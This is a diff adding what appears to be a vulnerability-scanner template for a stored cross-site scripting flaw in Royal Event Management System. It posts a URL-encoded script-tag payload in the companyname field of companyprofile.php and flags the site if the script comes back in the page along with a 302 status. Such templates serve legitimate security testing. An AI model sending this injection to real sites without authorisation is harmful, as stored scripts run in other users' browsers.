@@ -1,0 +1,28 @@
+id: royalevent-stored-xss
+brief:
+    title: Royal Event Management System - Stored Cross-Site Scripting
+    by: ritikchaddha
+    level: high
+    about: Royal Event Management System contains a stored cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected si...
+    label:
+        - xss
+        - unauthenticated
+        - cms
+        - royalevent
+        - packetstorm
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/royal_event/companyprofile.php'
+      body: companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&companyaddress=&companyemail=&country=India&mobilenumber=1234567899&submit=
+      signs:
+        - "on": word
+          has:
+            - value="><script>alert(document.domain)</script>" >
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 302
